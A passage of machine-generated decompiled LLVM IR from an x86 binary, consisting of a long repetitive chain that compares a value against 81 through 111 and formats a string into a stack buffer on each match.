dec_label_pc_804b026:                             ; preds = %dec_label_pc_804aff0, %dec_label_pc_804aff6
  %v13_804b026 = icmp eq i32 %v2_8049efa, 81
  %v1_804b02a = icmp eq i1 %v13_804b026, false
  br i1 %v1_804b02a, label %dec_label_pc_804b05c, label %dec_label_pc_804b02c

dec_label_pc_804b02c:                             ; preds = %dec_label_pc_804b026
  %v0_804b02c = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b02c = zext i8 %v0_804b02c to i32
  store i32 %v1_804b02c, i32* @edx, align 4
  %v0_804b036 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b036 = zext i8 %v0_804b036 to i32
  %v2_804b045 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b045, i32* @ebx, align 4
  %v4_804b057 = call i32 @szprintf(i32 %v2_804b045, i32 ptrtoint ([13 x i8]* @global_var_8057d48.121 to i32), i32 %v1_804b036)
  br label %dec_label_pc_804b05c

dec_label_pc_804b05c:                             ; preds = %dec_label_pc_804b026, %dec_label_pc_804b02c
  %v13_804b05c = icmp eq i32 %v2_8049efa, 82
  %v1_804b060 = icmp eq i1 %v13_804b05c, false
  br i1 %v1_804b060, label %dec_label_pc_804b092, label %dec_label_pc_804b062

dec_label_pc_804b062:                             ; preds = %dec_label_pc_804b05c
  %v0_804b062 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b062 = zext i8 %v0_804b062 to i32
  store i32 %v1_804b062, i32* @edx, align 4
  %v0_804b06c = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b06c = zext i8 %v0_804b06c to i32
  %v2_804b07b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b07b, i32* @ebx, align 4
  %v4_804b08d = call i32 @szprintf(i32 %v2_804b07b, i32 ptrtoint ([13 x i8]* @global_var_8057d55.122 to i32), i32 %v1_804b06c)
  br label %dec_label_pc_804b092

dec_label_pc_804b092:                             ; preds = %dec_label_pc_804b05c, %dec_label_pc_804b062
  %v13_804b092 = icmp eq i32 %v2_8049efa, 83
  %v1_804b096 = icmp eq i1 %v13_804b092, false
  br i1 %v1_804b096, label %dec_label_pc_804b0c8, label %dec_label_pc_804b098

dec_label_pc_804b098:                             ; preds = %dec_label_pc_804b092
  %v0_804b098 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b098 = zext i8 %v0_804b098 to i32
  store i32 %v1_804b098, i32* @edx, align 4
  %v0_804b0a2 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b0a2 = zext i8 %v0_804b0a2 to i32
  %v2_804b0b1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b0b1, i32* @ebx, align 4
  %v4_804b0c3 = call i32 @szprintf(i32 %v2_804b0b1, i32 ptrtoint ([13 x i8]* @global_var_8057d62.123 to i32), i32 %v1_804b0a2)
  br label %dec_label_pc_804b0c8

dec_label_pc_804b0c8:                             ; preds = %dec_label_pc_804b092, %dec_label_pc_804b098
  %v13_804b0c8 = icmp eq i32 %v2_8049efa, 84
  %v1_804b0cc = icmp eq i1 %v13_804b0c8, false
  br i1 %v1_804b0cc, label %dec_label_pc_804b0fe, label %dec_label_pc_804b0ce

dec_label_pc_804b0ce:                             ; preds = %dec_label_pc_804b0c8
  %v0_804b0ce = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b0ce = zext i8 %v0_804b0ce to i32
  store i32 %v1_804b0ce, i32* @edx, align 4
  %v0_804b0d8 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b0d8 = zext i8 %v0_804b0d8 to i32
  %v2_804b0e7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b0e7, i32* @ebx, align 4
  %v4_804b0f9 = call i32 @szprintf(i32 %v2_804b0e7, i32 ptrtoint ([13 x i8]* @global_var_8057d6f.124 to i32), i32 %v1_804b0d8)
  br label %dec_label_pc_804b0fe

dec_label_pc_804b0fe:                             ; preds = %dec_label_pc_804b0c8, %dec_label_pc_804b0ce
  %v13_804b0fe = icmp eq i32 %v2_8049efa, 85
  %v1_804b102 = icmp eq i1 %v13_804b0fe, false
  br i1 %v1_804b102, label %dec_label_pc_804b134, label %dec_label_pc_804b104

dec_label_pc_804b104:                             ; preds = %dec_label_pc_804b0fe
  %v0_804b104 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b104 = zext i8 %v0_804b104 to i32
  store i32 %v1_804b104, i32* @edx, align 4
  %v0_804b10e = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b10e = zext i8 %v0_804b10e to i32
  %v2_804b11d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b11d, i32* @ebx, align 4
  %v4_804b12f = call i32 @szprintf(i32 %v2_804b11d, i32 ptrtoint ([13 x i8]* @global_var_8057d7c.125 to i32), i32 %v1_804b10e)
  br label %dec_label_pc_804b134

dec_label_pc_804b134:                             ; preds = %dec_label_pc_804b0fe, %dec_label_pc_804b104
  %v13_804b134 = icmp eq i32 %v2_8049efa, 86
  %v1_804b138 = icmp eq i1 %v13_804b134, false
  br i1 %v1_804b138, label %dec_label_pc_804b16a, label %dec_label_pc_804b13a

dec_label_pc_804b13a:                             ; preds = %dec_label_pc_804b134
  %v0_804b13a = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b13a = zext i8 %v0_804b13a to i32
  store i32 %v1_804b13a, i32* @edx, align 4
  %v0_804b144 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b144 = zext i8 %v0_804b144 to i32
  %v2_804b153 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b153, i32* @ebx, align 4
  %v4_804b165 = call i32 @szprintf(i32 %v2_804b153, i32 ptrtoint ([13 x i8]* @global_var_8057d89.126 to i32), i32 %v1_804b144)
  br label %dec_label_pc_804b16a

dec_label_pc_804b16a:                             ; preds = %dec_label_pc_804b134, %dec_label_pc_804b13a
  %v13_804b16a = icmp eq i32 %v2_8049efa, 87
  %v1_804b16e = icmp eq i1 %v13_804b16a, false
  br i1 %v1_804b16e, label %dec_label_pc_804b1a0, label %dec_label_pc_804b170

dec_label_pc_804b170:                             ; preds = %dec_label_pc_804b16a
  %v0_804b170 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b170 = zext i8 %v0_804b170 to i32
  store i32 %v1_804b170, i32* @edx, align 4
  %v0_804b17a = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b17a = zext i8 %v0_804b17a to i32
  %v2_804b189 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b189, i32* @ebx, align 4
  %v4_804b19b = call i32 @szprintf(i32 %v2_804b189, i32 ptrtoint ([13 x i8]* @global_var_8057d96.127 to i32), i32 %v1_804b17a)
  br label %dec_label_pc_804b1a0

dec_label_pc_804b1a0:                             ; preds = %dec_label_pc_804b16a, %dec_label_pc_804b170
  %v13_804b1a0 = icmp eq i32 %v2_8049efa, 88
  %v1_804b1a4 = icmp eq i1 %v13_804b1a0, false
  br i1 %v1_804b1a4, label %dec_label_pc_804b1d6, label %dec_label_pc_804b1a6

dec_label_pc_804b1a6:                             ; preds = %dec_label_pc_804b1a0
  %v0_804b1a6 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b1a6 = zext i8 %v0_804b1a6 to i32
  store i32 %v1_804b1a6, i32* @edx, align 4
  %v0_804b1b0 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b1b0 = zext i8 %v0_804b1b0 to i32
  %v2_804b1bf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b1bf, i32* @ebx, align 4
  %v4_804b1d1 = call i32 @szprintf(i32 %v2_804b1bf, i32 ptrtoint ([13 x i8]* @global_var_8057da3.128 to i32), i32 %v1_804b1b0)
  br label %dec_label_pc_804b1d6

dec_label_pc_804b1d6:                             ; preds = %dec_label_pc_804b1a0, %dec_label_pc_804b1a6
  %v13_804b1d6 = icmp eq i32 %v2_8049efa, 89
  %v1_804b1da = icmp eq i1 %v13_804b1d6, false
  br i1 %v1_804b1da, label %dec_label_pc_804b20c, label %dec_label_pc_804b1dc

dec_label_pc_804b1dc:                             ; preds = %dec_label_pc_804b1d6
  %v0_804b1dc = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b1dc = zext i8 %v0_804b1dc to i32
  store i32 %v1_804b1dc, i32* @edx, align 4
  %v0_804b1e6 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b1e6 = zext i8 %v0_804b1e6 to i32
  %v2_804b1f5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b1f5, i32* @ebx, align 4
  %v4_804b207 = call i32 @szprintf(i32 %v2_804b1f5, i32 ptrtoint ([13 x i8]* @global_var_8057db0.129 to i32), i32 %v1_804b1e6)
  br label %dec_label_pc_804b20c

dec_label_pc_804b20c:                             ; preds = %dec_label_pc_804b1d6, %dec_label_pc_804b1dc
  %v13_804b20c = icmp eq i32 %v2_8049efa, 90
  %v1_804b210 = icmp eq i1 %v13_804b20c, false
  br i1 %v1_804b210, label %dec_label_pc_804b242, label %dec_label_pc_804b212

dec_label_pc_804b212:                             ; preds = %dec_label_pc_804b20c
  %v0_804b212 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b212 = zext i8 %v0_804b212 to i32
  store i32 %v1_804b212, i32* @edx, align 4
  %v0_804b21c = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b21c = zext i8 %v0_804b21c to i32
  %v2_804b22b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b22b, i32* @ebx, align 4
  %v4_804b23d = call i32 @szprintf(i32 %v2_804b22b, i32 ptrtoint ([13 x i8]* @global_var_8057dbd.130 to i32), i32 %v1_804b21c)
  br label %dec_label_pc_804b242

dec_label_pc_804b242:                             ; preds = %dec_label_pc_804b20c, %dec_label_pc_804b212
  %v13_804b242 = icmp eq i32 %v2_8049efa, 91
  %v1_804b246 = icmp eq i1 %v13_804b242, false
  br i1 %v1_804b246, label %dec_label_pc_804b278, label %dec_label_pc_804b248

dec_label_pc_804b248:                             ; preds = %dec_label_pc_804b242
  %v0_804b248 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b248 = zext i8 %v0_804b248 to i32
  store i32 %v1_804b248, i32* @edx, align 4
  %v0_804b252 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b252 = zext i8 %v0_804b252 to i32
  %v2_804b261 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b261, i32* @ebx, align 4
  %v4_804b273 = call i32 @szprintf(i32 %v2_804b261, i32 ptrtoint ([13 x i8]* @global_var_8057dca.131 to i32), i32 %v1_804b252)
  br label %dec_label_pc_804b278

dec_label_pc_804b278:                             ; preds = %dec_label_pc_804b242, %dec_label_pc_804b248
  %v13_804b278 = icmp eq i32 %v2_8049efa, 92
  %v1_804b27c = icmp eq i1 %v13_804b278, false
  br i1 %v1_804b27c, label %dec_label_pc_804b2ae, label %dec_label_pc_804b27e

dec_label_pc_804b27e:                             ; preds = %dec_label_pc_804b278
  %v0_804b27e = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b27e = zext i8 %v0_804b27e to i32
  store i32 %v1_804b27e, i32* @edx, align 4
  %v0_804b288 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b288 = zext i8 %v0_804b288 to i32
  %v2_804b297 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b297, i32* @ebx, align 4
  %v4_804b2a9 = call i32 @szprintf(i32 %v2_804b297, i32 ptrtoint ([13 x i8]* @global_var_8057dd7.132 to i32), i32 %v1_804b288)
  br label %dec_label_pc_804b2ae

dec_label_pc_804b2ae:                             ; preds = %dec_label_pc_804b278, %dec_label_pc_804b27e
  %v13_804b2ae = icmp eq i32 %v2_8049efa, 93
  %v1_804b2b2 = icmp eq i1 %v13_804b2ae, false
  br i1 %v1_804b2b2, label %dec_label_pc_804b2e4, label %dec_label_pc_804b2b4

dec_label_pc_804b2b4:                             ; preds = %dec_label_pc_804b2ae
  %v0_804b2b4 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b2b4 = zext i8 %v0_804b2b4 to i32
  store i32 %v1_804b2b4, i32* @edx, align 4
  %v0_804b2be = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b2be = zext i8 %v0_804b2be to i32
  %v2_804b2cd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b2cd, i32* @ebx, align 4
  %v4_804b2df = call i32 @szprintf(i32 %v2_804b2cd, i32 ptrtoint ([13 x i8]* @global_var_8057963.42 to i32), i32 %v1_804b2be)
  br label %dec_label_pc_804b2e4

dec_label_pc_804b2e4:                             ; preds = %dec_label_pc_804b2ae, %dec_label_pc_804b2b4
  %v13_804b2e4 = icmp eq i32 %v2_8049efa, 94
  %v1_804b2e8 = icmp eq i1 %v13_804b2e4, false
  br i1 %v1_804b2e8, label %dec_label_pc_804b31a, label %dec_label_pc_804b2ea

dec_label_pc_804b2ea:                             ; preds = %dec_label_pc_804b2e4
  %v0_804b2ea = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b2ea = zext i8 %v0_804b2ea to i32
  store i32 %v1_804b2ea, i32* @edx, align 4
  %v0_804b2f4 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b2f4 = zext i8 %v0_804b2f4 to i32
  %v2_804b303 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b303, i32* @ebx, align 4
  %v4_804b315 = call i32 @szprintf(i32 %v2_804b303, i32 ptrtoint ([13 x i8]* @global_var_8057de4.133 to i32), i32 %v1_804b2f4)
  br label %dec_label_pc_804b31a

dec_label_pc_804b31a:                             ; preds = %dec_label_pc_804b2e4, %dec_label_pc_804b2ea
  %v13_804b31a = icmp eq i32 %v2_8049efa, 95
  %v1_804b31e = icmp eq i1 %v13_804b31a, false
  br i1 %v1_804b31e, label %dec_label_pc_804b350, label %dec_label_pc_804b320

dec_label_pc_804b320:                             ; preds = %dec_label_pc_804b31a
  %v0_804b320 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b320 = zext i8 %v0_804b320 to i32
  store i32 %v1_804b320, i32* @edx, align 4
  %v0_804b32a = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b32a = zext i8 %v0_804b32a to i32
  %v2_804b339 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b339, i32* @ebx, align 4
  %v4_804b34b = call i32 @szprintf(i32 %v2_804b339, i32 ptrtoint ([13 x i8]* @global_var_8057df1.134 to i32), i32 %v1_804b32a)
  br label %dec_label_pc_804b350

dec_label_pc_804b350:                             ; preds = %dec_label_pc_804b31a, %dec_label_pc_804b320
  %v10_804b350 = icmp eq i32 %v2_8049efa, 96
  %v1_804b354 = icmp eq i1 %v10_804b350, false
  br i1 %v1_804b354, label %dec_label_pc_804b386, label %dec_label_pc_804b356

dec_label_pc_804b356:                             ; preds = %dec_label_pc_804b350
  %v0_804b356 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b356 = zext i8 %v0_804b356 to i32
  store i32 %v1_804b356, i32* @edx, align 4
  %v0_804b360 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b360 = zext i8 %v0_804b360 to i32
  %v2_804b36f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b36f, i32* @ebx, align 4
  %v4_804b381 = call i32 @szprintf(i32 %v2_804b36f, i32 ptrtoint ([13 x i8]* @global_var_8057dfe.135 to i32), i32 %v1_804b360)
  br label %dec_label_pc_804b386

dec_label_pc_804b386:                             ; preds = %dec_label_pc_804b350, %dec_label_pc_804b356
  %v13_804b386 = icmp eq i32 %v2_8049efa, 97
  %v1_804b38a = icmp eq i1 %v13_804b386, false
  br i1 %v1_804b38a, label %dec_label_pc_804b3bc, label %dec_label_pc_804b38c

dec_label_pc_804b38c:                             ; preds = %dec_label_pc_804b386
  %v0_804b38c = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b38c = zext i8 %v0_804b38c to i32
  store i32 %v1_804b38c, i32* @edx, align 4
  %v0_804b396 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b396 = zext i8 %v0_804b396 to i32
  %v2_804b3a5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b3a5, i32* @ebx, align 4
  %v4_804b3b7 = call i32 @szprintf(i32 %v2_804b3a5, i32 ptrtoint ([13 x i8]* @global_var_8057e0b.136 to i32), i32 %v1_804b396)
  br label %dec_label_pc_804b3bc

dec_label_pc_804b3bc:                             ; preds = %dec_label_pc_804b386, %dec_label_pc_804b38c
  %v13_804b3bc = icmp eq i32 %v2_8049efa, 98
  %v1_804b3c0 = icmp eq i1 %v13_804b3bc, false
  br i1 %v1_804b3c0, label %dec_label_pc_804b3f2, label %dec_label_pc_804b3c2

dec_label_pc_804b3c2:                             ; preds = %dec_label_pc_804b3bc
  %v0_804b3c2 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b3c2 = zext i8 %v0_804b3c2 to i32
  store i32 %v1_804b3c2, i32* @edx, align 4
  %v0_804b3cc = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b3cc = zext i8 %v0_804b3cc to i32
  %v2_804b3db = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b3db, i32* @ebx, align 4
  %v4_804b3ed = call i32 @szprintf(i32 %v2_804b3db, i32 ptrtoint ([13 x i8]* @global_var_8057e18.137 to i32), i32 %v1_804b3cc)
  br label %dec_label_pc_804b3f2

dec_label_pc_804b3f2:                             ; preds = %dec_label_pc_804b3bc, %dec_label_pc_804b3c2
  %v13_804b3f2 = icmp eq i32 %v2_8049efa, 99
  %v1_804b3f6 = icmp eq i1 %v13_804b3f2, false
  br i1 %v1_804b3f6, label %dec_label_pc_804b428, label %dec_label_pc_804b3f8

dec_label_pc_804b3f8:                             ; preds = %dec_label_pc_804b3f2
  %v0_804b3f8 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b3f8 = zext i8 %v0_804b3f8 to i32
  store i32 %v1_804b3f8, i32* @edx, align 4
  %v0_804b402 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b402 = zext i8 %v0_804b402 to i32
  %v2_804b411 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b411, i32* @ebx, align 4
  %v4_804b423 = call i32 @szprintf(i32 %v2_804b411, i32 ptrtoint ([13 x i8]* @global_var_8057e25.138 to i32), i32 %v1_804b402)
  br label %dec_label_pc_804b428

dec_label_pc_804b428:                             ; preds = %dec_label_pc_804b3f2, %dec_label_pc_804b3f8
  %v13_804b428 = icmp eq i32 %v2_8049efa, 100
  %v1_804b42c = icmp eq i1 %v13_804b428, false
  br i1 %v1_804b42c, label %dec_label_pc_804b45e, label %dec_label_pc_804b42e

dec_label_pc_804b42e:                             ; preds = %dec_label_pc_804b428
  %v0_804b42e = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b42e = zext i8 %v0_804b42e to i32
  store i32 %v1_804b42e, i32* @edx, align 4
  %v0_804b438 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b438 = zext i8 %v0_804b438 to i32
  %v2_804b447 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b447, i32* @ebx, align 4
  %v4_804b459 = call i32 @szprintf(i32 %v2_804b447, i32 ptrtoint ([13 x i8]* @global_var_8057e32.139 to i32), i32 %v1_804b438)
  br label %dec_label_pc_804b45e

dec_label_pc_804b45e:                             ; preds = %dec_label_pc_804b428, %dec_label_pc_804b42e
  %v13_804b45e = icmp eq i32 %v2_8049efa, 101
  %v1_804b462 = icmp eq i1 %v13_804b45e, false
  br i1 %v1_804b462, label %dec_label_pc_804b494, label %dec_label_pc_804b464

dec_label_pc_804b464:                             ; preds = %dec_label_pc_804b45e
  %v0_804b464 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b464 = zext i8 %v0_804b464 to i32
  store i32 %v1_804b464, i32* @edx, align 4
  %v0_804b46e = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b46e = zext i8 %v0_804b46e to i32
  %v2_804b47d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b47d, i32* @ebx, align 4
  %v4_804b48f = call i32 @szprintf(i32 %v2_804b47d, i32 ptrtoint ([13 x i8]* @global_var_8057e3f.140 to i32), i32 %v1_804b46e)
  br label %dec_label_pc_804b494

dec_label_pc_804b494:                             ; preds = %dec_label_pc_804b45e, %dec_label_pc_804b464
  %v13_804b494 = icmp eq i32 %v2_8049efa, 102
  %v1_804b498 = icmp eq i1 %v13_804b494, false
  br i1 %v1_804b498, label %dec_label_pc_804b4ca, label %dec_label_pc_804b49a

dec_label_pc_804b49a:                             ; preds = %dec_label_pc_804b494
  %v0_804b49a = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b49a = zext i8 %v0_804b49a to i32
  store i32 %v1_804b49a, i32* @edx, align 4
  %v0_804b4a4 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b4a4 = zext i8 %v0_804b4a4 to i32
  %v2_804b4b3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b4b3, i32* @ebx, align 4
  %v4_804b4c5 = call i32 @szprintf(i32 %v2_804b4b3, i32 ptrtoint ([12 x i8]* @global_var_8057e4c.141 to i32), i32 %v1_804b4a4)
  br label %dec_label_pc_804b4ca

dec_label_pc_804b4ca:                             ; preds = %dec_label_pc_804b494, %dec_label_pc_804b49a
  %v13_804b4ca = icmp eq i32 %v2_8049efa, 103
  %v1_804b4ce = icmp eq i1 %v13_804b4ca, false
  br i1 %v1_804b4ce, label %dec_label_pc_804b500, label %dec_label_pc_804b4d0

dec_label_pc_804b4d0:                             ; preds = %dec_label_pc_804b4ca
  %v0_804b4d0 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b4d0 = zext i8 %v0_804b4d0 to i32
  store i32 %v1_804b4d0, i32* @edx, align 4
  %v0_804b4da = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b4da = zext i8 %v0_804b4da to i32
  %v2_804b4e9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b4e9, i32* @ebx, align 4
  %v4_804b4fb = call i32 @szprintf(i32 %v2_804b4e9, i32 ptrtoint ([13 x i8]* @global_var_8057e58.142 to i32), i32 %v1_804b4da)
  br label %dec_label_pc_804b500

dec_label_pc_804b500:                             ; preds = %dec_label_pc_804b4ca, %dec_label_pc_804b4d0
  %v13_804b500 = icmp eq i32 %v2_8049efa, 104
  %v1_804b504 = icmp eq i1 %v13_804b500, false
  br i1 %v1_804b504, label %dec_label_pc_804b536, label %dec_label_pc_804b506

dec_label_pc_804b506:                             ; preds = %dec_label_pc_804b500
  %v0_804b506 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b506 = zext i8 %v0_804b506 to i32
  store i32 %v1_804b506, i32* @edx, align 4
  %v0_804b510 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b510 = zext i8 %v0_804b510 to i32
  %v2_804b51f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b51f, i32* @ebx, align 4
  %v4_804b531 = call i32 @szprintf(i32 %v2_804b51f, i32 ptrtoint ([13 x i8]* @global_var_8057e65.143 to i32), i32 %v1_804b510)
  br label %dec_label_pc_804b536

dec_label_pc_804b536:                             ; preds = %dec_label_pc_804b500, %dec_label_pc_804b506
  %v13_804b536 = icmp eq i32 %v2_8049efa, 105
  %v1_804b53a = icmp eq i1 %v13_804b536, false
  br i1 %v1_804b53a, label %dec_label_pc_804b56c, label %dec_label_pc_804b53c

dec_label_pc_804b53c:                             ; preds = %dec_label_pc_804b536
  %v0_804b53c = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b53c = zext i8 %v0_804b53c to i32
  store i32 %v1_804b53c, i32* @edx, align 4
  %v0_804b546 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b546 = zext i8 %v0_804b546 to i32
  %v2_804b555 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b555, i32* @ebx, align 4
  %v4_804b567 = call i32 @szprintf(i32 %v2_804b555, i32 ptrtoint ([13 x i8]* @global_var_8057e72.144 to i32), i32 %v1_804b546)
  br label %dec_label_pc_804b56c

dec_label_pc_804b56c:                             ; preds = %dec_label_pc_804b536, %dec_label_pc_804b53c
  %v13_804b56c = icmp eq i32 %v2_8049efa, 106
  %v1_804b570 = icmp eq i1 %v13_804b56c, false
  br i1 %v1_804b570, label %dec_label_pc_804b5a2, label %dec_label_pc_804b572

dec_label_pc_804b572:                             ; preds = %dec_label_pc_804b56c
  %v0_804b572 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b572 = zext i8 %v0_804b572 to i32
  store i32 %v1_804b572, i32* @edx, align 4
  %v0_804b57c = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b57c = zext i8 %v0_804b57c to i32
  %v2_804b58b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b58b, i32* @ebx, align 4
  %v4_804b59d = call i32 @szprintf(i32 %v2_804b58b, i32 ptrtoint ([12 x i8]* @global_var_8057e7f.145 to i32), i32 %v1_804b57c)
  br label %dec_label_pc_804b5a2

dec_label_pc_804b5a2:                             ; preds = %dec_label_pc_804b56c, %dec_label_pc_804b572
  %v13_804b5a2 = icmp eq i32 %v2_8049efa, 107
  %v1_804b5a6 = icmp eq i1 %v13_804b5a2, false
  br i1 %v1_804b5a6, label %dec_label_pc_804b5d8, label %dec_label_pc_804b5a8

dec_label_pc_804b5a8:                             ; preds = %dec_label_pc_804b5a2
  %v0_804b5a8 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b5a8 = zext i8 %v0_804b5a8 to i32
  store i32 %v1_804b5a8, i32* @edx, align 4
  %v0_804b5b2 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b5b2 = zext i8 %v0_804b5b2 to i32
  %v2_804b5c1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b5c1, i32* @ebx, align 4
  %v4_804b5d3 = call i32 @szprintf(i32 %v2_804b5c1, i32 ptrtoint ([13 x i8]* @global_var_8057e8b.146 to i32), i32 %v1_804b5b2)
  br label %dec_label_pc_804b5d8

dec_label_pc_804b5d8:                             ; preds = %dec_label_pc_804b5a2, %dec_label_pc_804b5a8
  %v13_804b5d8 = icmp eq i32 %v2_8049efa, 108
  %v1_804b5dc = icmp eq i1 %v13_804b5d8, false
  br i1 %v1_804b5dc, label %dec_label_pc_804b60e, label %dec_label_pc_804b5de

dec_label_pc_804b5de:                             ; preds = %dec_label_pc_804b5d8
  %v0_804b5de = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b5de = zext i8 %v0_804b5de to i32
  store i32 %v1_804b5de, i32* @edx, align 4
  %v0_804b5e8 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b5e8 = zext i8 %v0_804b5e8 to i32
  %v2_804b5f7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b5f7, i32* @ebx, align 4
  %v4_804b609 = call i32 @szprintf(i32 %v2_804b5f7, i32 ptrtoint ([14 x i8]* @global_var_8057e98.147 to i32), i32 %v1_804b5e8)
  br label %dec_label_pc_804b60e

dec_label_pc_804b60e:                             ; preds = %dec_label_pc_804b5d8, %dec_label_pc_804b5de
  %v13_804b60e = icmp eq i32 %v2_8049efa, 109
  %v1_804b612 = icmp eq i1 %v13_804b60e, false
  br i1 %v1_804b612, label %dec_label_pc_804b644, label %dec_label_pc_804b614

dec_label_pc_804b614:                             ; preds = %dec_label_pc_804b60e
  %v0_804b614 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b614 = zext i8 %v0_804b614 to i32
  store i32 %v1_804b614, i32* @edx, align 4
  %v0_804b61e = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b61e = zext i8 %v0_804b61e to i32
  %v2_804b62d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b62d, i32* @ebx, align 4
  %v4_804b63f = call i32 @szprintf(i32 %v2_804b62d, i32 ptrtoint ([14 x i8]* @global_var_8057ea6.148 to i32), i32 %v1_804b61e)
  br label %dec_label_pc_804b644

dec_label_pc_804b644:                             ; preds = %dec_label_pc_804b60e, %dec_label_pc_804b614
  %v13_804b644 = icmp eq i32 %v2_8049efa, 110
  %v1_804b648 = icmp eq i1 %v13_804b644, false
  br i1 %v1_804b648, label %dec_label_pc_804b67a, label %dec_label_pc_804b64a

dec_label_pc_804b64a:                             ; preds = %dec_label_pc_804b644
  %v0_804b64a = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b64a = zext i8 %v0_804b64a to i32
  store i32 %v1_804b64a, i32* @edx, align 4
  %v0_804b654 = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b654 = zext i8 %v0_804b654 to i32
  %v2_804b663 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b663, i32* @ebx, align 4
  %v4_804b675 = call i32 @szprintf(i32 %v2_804b663, i32 ptrtoint ([13 x i8]* @global_var_8057eb4.149 to i32), i32 %v1_804b654)
  br label %dec_label_pc_804b67a

dec_label_pc_804b67a:                             ; preds = %dec_label_pc_804b644, %dec_label_pc_804b64a
  %v13_804b67a = icmp eq i32 %v2_8049efa, 111
  %v1_804b67e = icmp eq i1 %v13_804b67a, false
  br i1 %v1_804b67e, label %dec_label_pc_804b6b0, label %dec_label_pc_804b680

dec_label_pc_804b680:                             ; preds = %dec_label_pc_804b67a
  %v0_804b680 = load i8, i8* @global_var_806259a.41, align 2
  %v1_804b680 = zext i8 %v0_804b680 to i32
  store i32 %v1_804b680, i32* @edx, align 4
  %v0_804b68a = load i8, i8* @global_var_8062599.40, align 1
  %v1_804b68a = zext i8 %v0_804b68a to i32
  %v2_804b699 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b699, i32* @ebx, align 4
